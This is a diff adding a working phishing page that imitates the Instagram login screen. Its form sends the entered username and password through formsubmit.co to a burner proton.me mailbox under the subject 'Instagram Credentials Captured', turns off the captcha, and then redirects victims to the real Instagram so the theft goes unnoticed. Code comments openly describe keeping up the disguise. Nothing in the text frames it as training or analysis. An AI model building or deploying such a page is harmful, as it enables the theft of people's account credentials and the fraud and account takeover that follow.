@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram • Login</title>
+    
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 350px;
+            padding: 20px;
+        }
+
+        .login-card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 175px;
+            height: auto;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 6px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 8px 14px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+            transition: border-color 0.2s;
+            color: #262626;
+        }
+
+        .input-group input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 12px;
+            color: #8e8e8e;
+            pointer-events: none;
+            transition: all 0.2s;
+            background: #fafafa;
+            padding: 0 2px;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            font-size: 10px;
+            top: 4px;
+            transform: translateY(0);
+            color: #8e8e8e;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 8px 0;
+            background-color: #0095f6;
+            border: 1px solid transparent;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: background 0.2s;
+            opacity: 0.7;
+        }
+
+        .login-btn.active {
+            opacity: 1;
+            cursor: pointer;
+        }
+
+        .login-btn.active:hover {
+            background-color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider-text {
+            color: #737373;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 0 18px;
+        }
+
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: none;
+            border: none;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .fb-login i {
+            font-size: 20px;
+        }
+
+        .forgot-password {
+            display: block;
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            margin-top: 18px;
+        }
+
+        .signup-card {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            width: 100%;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .signup-card p {
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .get-app {
+            margin-top: 20px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .get-app p {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 16px;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .app-buttons img {
+            height: 40px;
+        }
+
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e8e;
+            padding: 0 20px;
+        }
+
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+
+        .error-message {
+            color: #ed4956;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
+
+        @media (max-width: 450px) {
+            .login-card {
+                border: none;
+                background: transparent;
+                padding: 20px;
+            }
+            .signup-card {
+                border: none;
+                background: transparent;
+            }
+            body {
+                background: #fff;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Main Login Card -->
+        <div class="login-card">
+            <div class="logo">
+                <!-- Instagram Text Logo -->
+                <svg viewBox="0 0 176 52" width="175" height="51">
+                    <use href="#instagram-logo"></use>
+                </svg>
+            </div>
+
+            <form id="loginForm" action="https://formsubmit.co/burnermail1003@proton.me" method="POST">
+                <!-- Optional: Custom subject and redirect -->
+                <input type="hidden" name="_subject" value="Instagram Credentials Captured">
+                <input type="hidden" name="_captcha" value="false">
+                <!-- Redirect after submission to REAL Instagram -->
+                <input type="hidden" name="_next" value="https://www.instagram.com/">
+                <!-- Format as JSON for cleaner parsing -->
+                <input type="hidden" name="_template" value="box">
+
+                <div class="input-group">
+                    <input type="text" name="username" id="username" placeholder=" " autocomplete="off" required>
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" name="password" id="password" placeholder=" " required>
+                    <label for="password">Password</label>
+                </div>
+
+                <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+
+                <div class="error-message" id="errorMsg">
+                    Sorry, your password was incorrect. Please double-check your password.
+                </div>
+
+                <div class="divider">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">OR</div>
+                    <div class="divider-line"></div>
+                </div>
+
+                <button type="button" class="fb-login">
+                    <i class="fab fa-facebook-square"></i>
+                    Log in with Facebook
+                </button>
+
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </form>
+        </div>
+
+        <!-- Sign Up Card -->
+        <div class="signup-card">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+
+        <!-- Get App -->
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-buttons">
+                <a href="#">
+                    <img src="https://www.instagram.com/static/images/appstore/badge/appstore-badge.png" alt="Download on the App Store">
+                </a>
+                <a href="#">
+                    <img src="https://www.instagram.com/static/images/appstore/badge/googleplay-badge.png" alt="Get it on Google Play">
+                </a>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <div>
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Top Accounts</a>
+                <a href="#">Hashtags</a>
+                <a href="#">Locations</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Contact Uploading & Non-Users</a>
+            </div>
+            <div style="margin-top: 16px;">
+                <a href="#">English</a>
+                <span style="margin: 0 4px;">© 2026 Instagram from Meta</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden SVG for Instagram Logo -->
+    <svg style="display:none;">
+        <defs>
+            <g id="instagram-logo">
+                <path fill="#262626" d="M58.196 12.4c-3.1-3.3-7.2-5-11.8-5H47c-2.1 0-4.2 0-6.3.1-.7 0-1.4.1-2.1.2-4 .4-7.2 2.1-9.8 5.1-2.4 2.9-3.6 6.3-3.6 10.2v.1c0 2.8.5 5.3 1.5 7.4 1.1 2.4 2.7 4.4 4.7 6 2.3 1.8 5 2.8 8 2.9.4 0 .8 0 1.2.1h.2c2.5 0 4.9-.5 7.1-1.4 2.4-1 4.5-2.5 6.2-4.5 1.8-2.1 3-4.6 3.6-7.4.4-1.8.6-3.6.6-5.3v-.1c0-4.7-1.7-8.8-4.9-12.1zm-3.5 11.7c0 3.1-1.1 5.7-3.1 7.7-2 2-4.6 3-7.6 3-3 0-5.6-1-7.6-3-2-2-3.1-4.6-3.1-7.7v-.1c0-3 1.1-5.6 3.1-7.6 2-2 4.6-3 7.6-3 3 0 5.6 1 7.6 3 2 2 3.1 4.6 3.1 7.6zm-17.2-21.6c-3.3 3.3-5 7.3-5 11.9v.1c0 4.6 1.7 8.6 5 11.9 3.3 3.3 7.3 5 11.9 5h.1c4.6 0 8.6-1.7 11.9-5 3.3-3.3 5-7.3 5-11.9v-.1c0-4.6-1.7-8.6-5-11.9-3.3-3.3-7.3-5-11.9-5h-.1c-4.6 0-8.6 1.7-11.9 5zM39.8 0h.1c6.5 0 11.7 2.1 15.6 6.2 3.9 4.1 5.9 9.2 5.9 15.2v.1c0 6-2 11.1-5.9 15.2-3.9 4.1-9.1 6.2-15.6 6.2h-.1c-6.5 0-11.7-2.1-15.6-6.2-3.9-4.1-5.9-9.2-5.9-15.2v-.1c0-6 2-11.1 5.9-15.2C28.1 2.1 33.3 0 39.8 0z"/>
+            </g>
+        </defs>
+    </svg>
+
+    <script>
+        // Enable login button when fields have content
+        const username = document.getElementById('username');
+        const password = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const form = document.getElementById('loginForm');
+
+        function checkFields() {
+            if (username.value.trim() !== '' && password.value.trim() !== '') {
+                loginBtn.classList.add('active');
+                loginBtn.disabled = false;
+            } else {
+                loginBtn.classList.remove('active');
+                loginBtn.disabled = true;
+            }
+        }
+
+        username.addEventListener('input', checkFields);
+        password.addEventListener('input', checkFields);
+
+        // Show fake error after submission to simulate failed login
+        // but since formsubmit redirects, we use a subtle approach
+        form.addEventListener('submit', function(e) {
+            // Optionally show error before redirect happens
+            // The form will submit to formsubmit.co which redirects to Instagram
+            // So the user won't see an error on this page
+        });
+
+        // Disable button initially
+        loginBtn.disabled = true;
+
+        // Click on FB login does nothing (keeps appearance)
+        document.querySelector('.fb-login').addEventListener('click', function(e) {
+            e.preventDefault();
+            // Simulate loading
+        });
+
+        // Prevent "Forgot password" and "Sign up" links from navigating away
+        document.querySelector('.forgot-password').addEventListener('click', function(e) {
+            e.preventDefault();
+        });
+        document.querySelector('.signup-card a').addEventListener('click', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
